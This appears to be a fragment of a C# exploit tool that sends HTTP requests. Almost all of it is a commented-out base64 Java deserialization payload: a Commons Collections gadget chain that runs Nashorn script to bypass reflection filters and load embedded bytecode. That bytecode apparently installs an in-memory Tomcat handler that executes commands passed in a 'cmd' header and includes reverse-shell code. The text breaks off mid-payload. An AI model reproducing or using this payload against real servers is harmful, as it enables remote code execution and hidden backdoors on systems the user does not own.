                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "GET"; //POST请求
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0";
                //   req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
                // req.ContentType = "text/json";
                //    req.Headers.Add("cmd", textBox17.Text);
                //   String postid = "{{base64dec(rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyACBqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlcgAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAHQAC25ld0luc3RhbmNldXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAc3EAfgATdXEAfgAYAAAAAXQAAmpzdAAPZ2V0RW5naW5lQnlOYW1ldXEAfgAbAAAAAXZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHNxAH4AE3VxAH4AGAAAAAF0LWx0cnkgewogIGxvYWQoIm5hc2hvcm46bW96aWxsYV9jb21wYXQuanMiKTsKfSBjYXRjaCAoZSkge30KZnVuY3Rpb24gZ2V0VW5zYWZlKCl7CiAgdmFyIHRoZVVuc2FmZU1ldGhvZCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5VbnNhZmUiKS5nZXREZWNsYXJlZEZpZWxkKCd0aGVVbnNhZmUnKTsKICB0aGVVbnNhZmVNZXRob2Quc2V0QWNjZXNzaWJsZSh0cnVlKTsgCiAgcmV0dXJuIHRoZVVuc2FmZU1ldGhvZC5nZXQobnVsbCk7Cn0KZnVuY3Rpb24gcmVtb3ZlQ2xhc3NDYWNoZShjbGF6eil7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGF6ekFub255bW91c0NsYXNzID0gdW5zYWZlLmRlZmluZUFub255bW91c0NsYXNzKGNsYXp6LGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKS5nZXRSZXNvdXJjZUFzU3RyZWFtKCJDbGFzcy5jbGFzcyIpLnJlYWRBbGxCeXRlcygpLG51bGwpOwogIHZhciByZWZsZWN0aW9uRGF0YUZpZWxkID0gY2xhenpBbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJyZWZsZWN0aW9uRGF0YSIpOwogIHVuc2FmZS5wdXRPYmplY3QoY2xhenosdW5zYWZlLm9iamVjdEZpZWxkT2Zmc2V0KHJlZmxlY3Rpb25EYXRhRmllbGQpLG51bGwpOwp9CmZ1bmN0aW9uIGJ5cGFzc1JlZmxlY3Rpb25GaWx0ZXIoKSB7CiAgdmFyIHJlZmxlY3Rpb25DbGFzczsKICB0cnkgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImpkay5pbnRlcm5hbC5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9IGNhdGNoIChlcnJvcikgewogICAgcmVmbGVjdGlvbkNsYXNzID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoInN1bi5yZWZsZWN0LlJlZmxlY3Rpb24iKTsKICB9CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpOwogIHZhciBjbGFzc0J1ZmZlciA9IHJlZmxlY3Rpb25DbGFzcy5nZXRSZXNvdXJjZUFzU3RyZWFtKCJSZWZsZWN0aW9uLmNsYXNzIikucmVhZEFsbEJ5dGVzKCk7CiAgdmFyIHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcyA9IHVuc2FmZS5kZWZpbmVBbm9ueW1vdXNDbGFzcyhyZWZsZWN0aW9uQ2xhc3MsIGNsYXNzQnVmZmVyLCBudWxsKTsKICB2YXIgZmllbGRGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJmaWVsZEZpbHRlck1hcCIpOwogIHZhciBtZXRob2RGaWx0ZXJNYXBGaWVsZCA9IHJlZmxlY3Rpb25Bbm9ueW1vdXNDbGFzcy5nZXREZWNsYXJlZEZpZWxkKCJtZXRob2RGaWx0ZXJNYXAiKTsKICBpZiAoZmllbGRGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQoZmllbGRGaWx0ZXJNYXBGaWVsZCksIGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuSGFzaE1hcCIpLmdldENvbnN0cnVjdG9yKCkubmV3SW5zdGFuY2UoKSk7CiAgfQogIGlmIChtZXRob2RGaWx0ZXJNYXBGaWVsZC5nZXRUeXBlKCkuaXNBc3NpZ25hYmxlRnJvbShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKSkpIHsKICAgIHVuc2FmZS5wdXRPYmplY3QocmVmbGVjdGlvbkNsYXNzLCB1bnNhZmUuc3RhdGljRmllbGRPZmZzZXQobWV0aG9kRmlsdGVyTWFwRmllbGQpLCBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS51dGlsLkhhc2hNYXAiKS5nZXRDb25zdHJ1Y3RvcigpLm5ld0luc3RhbmNlKCkpOwogIH0KICByZW1vdmVDbGFzc0NhY2hlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLmxhbmcuQ2xhc3MiKSk7Cn0KZnVuY3Rpb24gc2V0QWNjZXNzaWJsZShhY2Nlc3NpYmxlT2JqZWN0KXsKICAgIHZhciB1bnNhZmUgPSBnZXRVbnNhZmUoKTsKICAgIHZhciBvdmVycmlkZUZpZWxkID0gamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoImphdmEubGFuZy5yZWZsZWN0LkFjY2Vzc2libGVPYmplY3QiKS5nZXREZWNsYXJlZEZpZWxkKCJvdmVycmlkZSIpOwogICAgdmFyIG9mZnNldCA9IHVuc2FmZS5vYmplY3RGaWVsZE9mZnNldChvdmVycmlkZUZpZWxkKTsKICAgIHVuc2FmZS5wdXRCb29sZWFuKGFjY2Vzc2libGVPYmplY3QsIG9mZnNldCwgdHJ1ZSk7Cn0KZnVuY3Rpb24gZGVmaW5lQ2xhc3MoYnl0ZXMpewogIHZhciBjbHogPSBudWxsOwogIHZhciB2ZXJzaW9uID0gamF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eSgiamF2YS52ZXJzaW9uIik7CiAgdmFyIHVuc2FmZSA9IGdldFVuc2FmZSgpCiAgdmFyIGNsYXNzTG9hZGVyID0gbmV3IGphdmEubmV0LlVSTENsYXNzTG9hZGVyKGphdmEubGFuZy5yZWZsZWN0LkFycmF5Lm5ld0luc3RhbmNlKGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLm5ldC5VUkwiKSwgMCkpOwogIHRyeXsKICAgIGlmICh2ZXJzaW9uLnNwbGl0KCIuIilbMF0gPj0gMTEpIHsKICAgICAgYnlwYXNzUmVmbGVjdGlvbkZpbHRlcigpOwogICAgZGVmaW5lQ2xhc3NNZXRob2QgPSBqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5sYW5nLkNsYXNzTG9hZGVyIikuZ2V0RGVjbGFyZWRNZXRob2QoImRlZmluZUNsYXNzIiwgamF2YS5sYW5nLkNsYXNzLmZvck5hbWUoIltCIiksamF2YS5sYW5nLkludGVnZXIuVFlQRSwgamF2YS5sYW5nLkludGVnZXIuVFlQRSk7CiAgICBzZXRBY2Nlc3NpYmxlKGRlZmluZUNsYXNzTWV0aG9kKTsKICAgIC8vIOe7lei/hyBzZXRBY2Nlc3NpYmxlIAogICAgY2x6ID0gZGVmaW5lQ2xhc3NNZXRob2QuaW52b2tlKGNsYXNzTG9hZGVyLCBieXRlcywgMCwgYnl0ZXMubGVuZ3RoKTsKICAgIH1lbHNlewogICAgICB2YXIgcHJvdGVjdGlvbkRvbWFpbiA9IG5ldyBqYXZhLnNlY3VyaXR5LlByb3RlY3Rpb25Eb21haW4obmV3IGphdmEuc2VjdXJpdHkuQ29kZVNvdXJjZShudWxsLCBqYXZhLmxhbmcucmVmbGVjdC5BcnJheS5uZXdJbnN0YW5jZShqYXZhLmxhbmcuQ2xhc3MuZm9yTmFtZSgiamF2YS5zZWN1cml0eS5jZXJ0LkNlcnRpZmljYXRlIiksIDApKSwgbnVsbCwgY2xhc3NMb2FkZXIsIFtdKTsKICAgICAgY2x6ID0gdW5zYWZlLmRlZmluZUNsYXNzKG51bGwsIGJ5dGVzLCAwLCBieXRlcy5sZW5ndGgsIGNsYXNzTG9hZGVyLCBwcm90ZWN0aW9uRG9tYWluKTsKICAgIH0KICB9Y2F0Y2goZXJyb3IpewogICAgZXJyb3IucHJpbnRTdGFja1RyYWNlKCk7CiAgfWZpbmFsbHl7CiAgICByZXR1cm4gY2x6OwogIH0KfQpmdW5jdGlvbiBiYXNlNjREZWNvZGVUb0J5dGUoc3RyKSB7CiAgdmFyIGJ0OwogIHRyeSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIikubmV3SW5zdGFuY2UoKS5kZWNvZGVCdWZmZXIoc3RyKTsKICB9IGNhdGNoIChlKSB7CiAgICBidCA9IGphdmEubGFuZy5DbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0IikubmV3SW5zdGFuY2UoKS5nZXREZWNvZGVyKCkuZGVjb2RlKHN0cik7CiAgfQogIHJldHVybiBidDsKfQp2YXIgY29kZT0ieXY2NnZnQUFBQzhCWndvQUlBQ1NCd0NUQndDVUNnQUNBSlVLQUFNQWxnb0FJZ0NYQ2dDWUFKa0tBSmdBbWdvQUlnQ2JDQUNjQ2dBZ0FKMEtBSjRBbndvQW5nQ2dCd0NoQ2dDWUFLSUlBSXdLQUNrQW93Z0FwQWdBcFFjQXBnZ0Fwd2dBcUFjQXFRb0FJQUNxQ0FDckNBQ3NCd0N0Q3dBYkFLNExBQnNBcndnQXNBZ0FzUWNBc2dvQUlBQ3pCd0MwQ2dDMUFMWUlBTGNKQUg0QXVBZ0F1UW9BZmdDNkNBQzdCd0M4Q2dCK0FMMEtBQ2tBdmdnQXZ3a0FMZ0RBQndEQkNnQXVBTUlJQU1NS0FINEF4QW9BSUFERkNBREdDUUIrQU1jSUFNZ0tBQ0FBeVFnQXlnY0F5d2dBekFnQXpRb0FtQURPQ2dEUEFNUUlBTkFLQUNrQTBRZ0EwZ29BS1FEVENBRFVDZ0FwQU5VS0FDa0ExZ2dBMXdvQUtRRFlDQURaQ2dBdUFOb0tBSDRBMndnQTNBb0FmZ0RkQ0FEZUNnRGZBT0FLQUNrQTRRZ0E0Z2dBNHdnQTVBY0E1UW9BVVFDWENnQlJBT1lJQU9jS0FGRUE2QWdBNlFnQTZnZ0E2d2dBN0FvQTdRRHVDZ0R0QU84SEFQQUtBUEVBOGdvQVhBRHpDQUQwQ2dCY0FQVUtBRndBOWdvQVhBRDNDZ0R4QVBnS0FQRUErUW9BT0FEb0NBRDZDZ0FwQUpZSUFQc0tBTzBBL0FjQS9Rb0FMZ0QrQ2dCcUFQOEtBR29BOGdvQThRRUFDZ0JxQVFBS0FHb0JBUW9CQWdFRENnRUNBUVFLQVFVQkJnb0JCUUVIQlFBQUFBQUFBQUF5Q2dDWUFRZ0tBUEVCQ1FvQWFnRUtDQUVMQ2dBNEFKVUlBUXdJQVEwSEFRNEJBQlpqYkdGemN5UnFZWFpoSkd4aGJtY2tVM1J5YVc1bkFRQVJUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQWxUZVc1MGFHVjBhV01CQUFkaGNuSmhlU1JDQVFBR1BHbHVhWFErQVFBREtDbFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFDa1Y0WTJWd2RHbHZibk1CQUFsc2IyRmtRMnhoYzNNQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFIWlhobFkzVjBaUUVBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUVaWGhsWXdFQUIzSmxkbVZ5YzJVQkFEa29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdUR3BoZG1FdmJHRnVaeTlKYm5SbFoyVnlPeWxNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFaamJHRnpjeVFCQUFwVGIzVnlZMlZHYVd4bEFRQUhRVFF1YW1GMllRd0JEd0NKQVFBZ2FtRjJZUzlzWVc1bkwwTnNZWE56VG05MFJtOTFibVJGZUdObGNIUnBiMjRCQUI1cVlYWmhMMnhoYm1jdlRtOURiR0Z6YzBSbFprWnZkVzVrUlhKeWIzSU1BUkFCRVF3QWd3RVNEQUNEQUlRSEFSTU1BUlFCRlF3QkZnRVhEQUVZQVJrQkFBZDBhSEpsWVdSekRBRWFBUnNIQVJ3TUFSMEJIZ3dCSHdFZ0FRQVRXMHhxWVhaaEwyeGhibWN2VkdoeVpXRmtPd3dCSVFFUkRBRWlBU01CQUFSb2RIUndBUUFHZEdGeVoyVjBBUUFTYW1GMllTOXNZVzVuTDFKMWJtNWhZbXhsQVFBR2RHaHBjeVF3QVFBSGFHRnVaR3hsY2dFQUhtcGhkbUV2YkdGdVp5OU9iMU4xWTJoR2FXVnNaRVY0WTJWd2RHbHZiZ3dCSkFFWkFRQUdaMnh2WW1Gc0FRQUtjSEp2WTJWemMyOXljd0VBRG1waGRtRXZkWFJwYkM5TWFYTjBEQUVsQVNZTUFSOEJKd0VBQTNKbGNRRUFDMmRsZEZKbGMzQnZibk5sQVFBUGFtRjJZUzlzWVc1bkwwTnNZWE56REFFb0FTa0JBQkJxWVhaaEwyeGhibWN2VDJKcVpXTjBCd0VxREFFckFTd0JBQWxuWlhSSVpXRmtaWElNQUg4QWdBRUFFR3BoZG1FdWJHRnVaeTVUZEhKcGJtY01BSThBaVFFQUEyTnRaQUVBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNNQUlvQWl3d0JMUUV1QVFBSmMyVjBVM1JoZEhWekRBRXZBSUFCQUJGcVlYWmhMMnhoYm1jdlNXNTBaV2RsY2d3QWd3RXdBUUFrYjNKbkxtRndZV05vWlM1MGIyMWpZWFF1ZFhScGJDNWlkV1l1UW5sMFpVTm9kVzVyREFDSUFJa01BVEVCTWdFQUNITmxkRUo1ZEdWekRBQ0NBSUFCQUFKYlFnd0JNd0VwQVFBSFpHOVhjbWwwWlFFQUUycGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNEJBQk5xWVhaaExtNXBieTVDZVhSbFFuVm1abVZ5QVFBRWQzSmhjQXdCTkFFMUJ3RTJBUUFBREFFM0FUZ0JBQkJqYjIxdFlXNWtJRzV2ZENCdWRXeHNEQUU1QVJFQkFBVWpJeU1qSXd3Qk9nRTdEQUU4QVQwQkFBRTZEQUUrQVQ4QkFDSmpiMjF0WVc1a0lISmxkbVZ5YzJVZ2FHOXpkQ0JtYjNKdFlYUWdaWEp5YjNJaERBRkFBVUVNQUkwQWpnRUFCVUJBUUVCQURBQ01BSXNCQUFkdmN5NXVZVzFsQndGQ0RBRkRBSXNNQVVRQkVRRUFBM2RwYmdFQUJIQnBibWNCQUFJdGJnRUFGbXBoZG1FdmJHRnVaeTlUZEhKcGJtZENkV1ptWlhJTUFVVUJSZ0VBQlNBdGJpQTBEQUZIQVJFQkFBSXZZd0VBQlNBdGRDQTBBUUFDYzJnQkFBSXRZd2NCU0F3QlNRRktEQUNNQVVzQkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnY0JUQXdCVFFGT0RBQ0RBVThCQUFKY1lRd0JVQUZSREFGU0FWTU1BVlFCRVF3QlZRRk9EQUZXQUlRQkFBY3ZZbWx1TDNOb0FRQUhZMjFrTG1WNFpRd0FqQUZYQVFBUGFtRjJZUzl1WlhRdlUyOWphMlYwREFGWUFTWU1BSU1CV1F3QldnRmJEQUZjQVZNSEFWME1BVjRCSmd3Qlh3RW1Cd0ZnREFGaEFUQU1BV0lBaEF3Qll3RmtEQUZsQVNZTUFXWUFoQUVBSFhKbGRtVnljMlVnWlhobFkzVjBaU0JsY25KdmNpd2diWE5uSUMwK0FRQUJJUUVBRTNKbGRtVnljMlVnWlhobFkzVjBaU0J2YXlFQkFBSkJOQUVBQjJadmNrNWhiV1VCQUFwblpYUk5aWE56WVdkbEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUJVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQkJxWVhaaEwyeGhibWN2VkdoeVpXRmtBUUFOWTNWeWNtVnVkRlJvY21WaFpBRUFGQ2dwVEdwaGRtRXZiR0Z1Wnk5VWFISmxZV1E3QVFBT1oyVjBWR2h5WldGa1IzSnZkWEFCQUJrb0tVeHFZWFpoTDJ4aGJtY3ZWR2h5WldGa1IzSnZkWEE3QVFBSVoyVjBRMnhoYzNNQkFCTW9LVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFRWjJWMFJHVmpiR0Z5WldSR2FXVnNaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrT3dFQUYycGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrQVFBTmMyVjBRV05qWlhOemFXSnNaUUVBQkNoYUtWWUJBQU5uWlhRQkFDWW9UR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQjJkbGRFNWhiV1VCQUFoamIyNTBZV2x1Y3dFQUd5aE1hbUYyWVM5c1lXNW5MME5vWVhKVFpYRjFaVzVqWlRzcFdnRUFEV2RsZEZOMWNHVnlZMnhoYzNNQkFBUnphWHBsQVFBREtDbEpBUUFWS0VrcFRHcGhkbUV2YkdGdVp5OVBZbXBsWTNRN0FRQUpaMlYwVFdWMGFHOWtBUUJBS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzF0TWFtRjJZUzlzWVc1bkwwTnNZWE56T3lsTWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlRXVjBhRzlrT3dFQUdHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwMWxkR2h2WkFFQUJtbHVkbTlyWlFFQU9TaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREdGJUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdLVXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPd0VBQ0dkbGRFSjVkR1Z6QVFBRUtDbGJRZ0VBQkZSWlVFVUJBQVFvU1NsV0FRQUxibVYzU1c1emRHRnVZMlVCQUJRb0tVeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME93RUFFV2RsZEVSbFkyeGhjbVZrVFdWMGFHOWtBUUFWWjJWMFEyOXVkR1Y0ZEVOc1lYTnpURzloWkdWeUFRQVpLQ2xNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU93RUFGV3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2dFQUJtVnhkV0ZzY3dFQUZTaE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BXZ0VBQkhSeWFXMEJBQXB6ZEdGeWRITlhhWFJvQVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bGFBUUFIY21Wd2JHRmpaUUVBUkNoTWFtRjJZUzlzWVc1bkwwTm9ZWEpUWlhGMVpXNWpaVHRNYW1GMllTOXNZVzVuTDBOb1lYSlRaWEYxWlc1alpUc3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFGYzNCc2FYUUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1Z0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBZDJZV3gxWlU5bUFRQW5LRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxNYW1GMllTOXNZVzVuTDBsdWRHVm5aWEk3QVFBUWFtRjJZUzlzWVc1bkwxTjVjM1JsYlFFQUMyZGxkRkJ5YjNCbGNuUjVBUUFMZEc5TWIzZGxja05oYzJVQkFBWmhjSEJsYm1RQkFDd29UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZtWm1WeU93RUFDSFJ2VTNSeWFXNW5BUUFSYW1GMllTOXNZVzVuTDFKMWJuUnBiV1VCQUFwblpYUlNkVzUwYVcxbEFRQVZLQ2xNYW1GMllTOXNZVzVuTDFKMWJuUnBiV1U3QVFBb0tGdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUIyaGhjMDVsZUhRQkFBTW9LVm9CQUFSdVpYaDBBUUFPWjJWMFJYSnliM0pUZEhKbFlXMEJBQWRrWlhOMGNtOTVBUUFuS0V4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3lsTWFtRjJZUzlzWVc1bkwxQnliMk5sYzNNN0FRQUlhVzUwVm1Gc2RXVUJBQllvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3U1NsV0FRQVBaMlYwVDNWMGNIVjBVM1J5WldGdEFRQVlLQ2xNYW1GMllTOXBieTlQZFhSd2RYUlRkSEpsWVcwN0FRQUlhWE5EYkc5elpXUUJBQk5xWVhaaEwybHZMMGx1Y0hWMFUzUnlaV0Z0QVFBSllYWmhhV3hoWW14bEFRQUVjbVZoWkFFQUZHcGhkbUV2YVc4dlQzVjBjSFYwVTNSeVpXRnRBUUFGZDNKcGRHVUJBQVZtYkhWemFBRUFCWE5zWldWd0FRQUVLRW9wVmdFQUNXVjRhWFJXWVd4MVpRRUFCV05zYjNObEFDRUFmZ0FpQUFBQUFnQUlBSDhBZ0FBQkFJRUFBQUFBQUFnQWdnQ0FBQUVBZ1FBQUFBQUFCZ0FCQUlNQWhBQUNBSVVBQUFRUkFBZ0FFUUFBQXRFcXR3QUd1QUFIdGdBSVRDdTJBQWtTQ3JZQUMwMHNCTFlBREN3cnRnQU53QUFPd0FBT1RnTTJCQlVFTGI2aUFxTXRGUVF5T2dVWkJjY0FCcWNDanhrRnRnQVBPZ1laQmhJUXRnQVJtZ0FOR1FZU0VyWUFFWm9BQnFjQ2NSa0Z0Z0FKRWhPMkFBdE5MQVMyQUF3c0dRVzJBQTA2QnhrSHdRQVVtZ0FHcHdKT0dRZTJBQWtTRmJZQUMwMHNCTFlBREN3WkI3WUFEVG9IR1FlMkFBa1NGcllBQzAybkFCWTZDQmtIdGdBSnRnQVl0Z0FZRWhhMkFBdE5MQVMyQUF3c0dRZTJBQTA2QnhrSHRnQUp0Z0FZRWhtMkFBdE5wd0FRT2dnWkI3WUFDUkladGdBTFRTd0V0Z0FNTEJrSHRnQU5PZ2NaQjdZQUNSSWF0Z0FMVFN3RXRnQU1MQmtIdGdBTndBQWJ3QUFiT2dnRE5na1ZDUmtJdVFBY0FRQ2lBYWdaQ0JVSnVRQWRBZ0E2Q2hrS3RnQUpFaDYyQUF0TkxBUzJBQXdzR1FxMkFBMDZDeGtMdGdBSkVoOER2UUFndGdBaEdRc0R2UUFpdGdBak9nd1pDN1lBQ1JJa0JMMEFJRmtEc2dBbHh3QVBFaWE0QUNkWnN3QWxwd0FHc2dBbFU3WUFJUmtMQkwwQUlsa0RFaWhUdGdBandBQXBPZzBaRGNjQUJxY0JKU29aRGJZQUtyWUFLem9PR1F5MkFBa1NMQVM5QUNCWkE3SUFMVk8yQUNFWkRBUzlBQ0paQTdzQUxsa1JBTWkzQUM5VHRnQWpWeW9TTUxZQU1Ub1BHUSsyQURJNkJ4a1BFak1HdlFBZ1dRT3lBRFRIQUE4U05iZ0FKMW16QURTbkFBYXlBRFJUV1FTeUFDMVRXUVd5QUMxVHRnQTJHUWNHdlFBaVdRTVpEbE5aQkxzQUxsa0R0d0F2VTFrRnV3QXVXUmtPdnJjQUwxTzJBQ05YR1F5MkFBa1NOd1M5QUNCWkF4a1BVN1lBSVJrTUJMMEFJbGtER1FkVHRnQWpWNmNBWWpvUEtoSTV0Z0F4T2hBWkVCSTZCTDBBSUZrRHNnQTB4d0FQRWpXNEFDZFpzd0EwcHdBR3NnQTBVN1lBTmhrUUJMMEFJbGtER1E1VHRnQWpPZ2NaRExZQUNSSTNCTDBBSUZrREdSQlR0Z0FoR1F3RXZRQWlXUU1aQjFPMkFDTlhwd0FYaEFrQnAvNVNwd0FJT2dhbkFBT0VCQUduL1Z5eEFBZ0Fsd0NpQUtVQUZ3REZBTk1BMWdBWEFkQUNWd0phQURnQU5nQTdBc1VBT0FBK0FGa0N4UUE0QUZ3QWZBTEZBRGdBZndLNUFzVUFPQUs4QXNJQ3hRQTRBQUVBaGdBQUFPNEFPd0FBQUEwQUJBQU9BQXNBRHdBVkFCQUFHZ0FSQUNZQUV3QXdBQlFBTmdBV0FENEFGd0JGQUJnQVhBQVpBR2NBR2dCc0FCc0FkQUFjQUg4QUhRQ0tBQjRBandBZkFKY0FJUUNpQUNRQXBRQWlBS2NBSXdDNEFDVUF2UUFtQU1VQUtBRFRBQ3NBMWdBcEFOZ0FLZ0RqQUN3QTZBQXRBUEFBTGdEN0FDOEJBQUF3QVE0QU1RRWRBRElCS0FBekFUTUFOQUU0QURVQlFBQTJBVmtBTndHU0FEZ0Jsd0E1QVpvQU93R2xBRHdCMEFBK0FkZ0FQd0hmQUVBQ05RQkJBbGNBUmdKYUFFSUNYQUJEQW1RQVJBS1hBRVVDdVFCSEFyd0FNUUxDQUVzQ3hRQkpBc2NBU2dMS0FCTUMwQUJOQUljQUFBQUVBQUVBT0FBQkFJZ0FpUUFDQUlVQUFBQTVBQUlBQXdBQUFCRXJ1QUFCc0UyNEFBZTJBRHNydGdBOHNBQUJBQUFBQkFBRkFBSUFBUUNHQUFBQURnQURBQUFBVndBRkFGZ0FCZ0JaQUljQUFBQUVBQUVBQWdBQkFJb0Fpd0FCQUlVQUFBQ1BBQVFBQXdBQUFGY3J4Z0FNRWowcnRnQSttUUFHRWord0s3WUFRRXdyRWtHMkFFS1pBQ2dyRWtFU1BiWUFReEpFdGdCRlRTeStCWjhBQmhKR3NDb3NBeklzQkRLNEFFZTJBRWl3S2lzU1FSSTl0Z0JERWtrU1BiWUFRN1lBU3JBQUFBQUJBSVlBQUFBbUFBa0FBQUJqQUEwQVpBQVFBR1lBRlFCbkFCNEFhUUFzQUdvQU1nQnJBRFVBYlFCREFHOEFBUUNNQUlzQUFRQ0ZBQUFCeWdBRUFBa0FBQUVxRWt1NEF